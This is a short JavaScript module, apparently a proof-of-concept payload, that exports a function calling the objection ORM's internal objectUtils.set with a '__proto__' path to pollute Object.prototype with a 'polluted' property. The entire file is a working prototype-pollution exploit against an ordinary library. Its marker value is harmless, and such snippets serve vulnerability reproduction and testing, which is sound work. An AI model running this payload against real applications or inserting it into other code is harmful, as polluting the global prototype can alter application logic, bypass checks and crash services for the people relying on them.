function getPayload() {
    return {
        setPrototypePollution: function() {
            let obj = {};
            require("objection/lib/utils/objectUtils").set(obj, ["__proto__", "polluted"], "yes");
            return obj;
        }
    };
}

module.exports = { getPayload };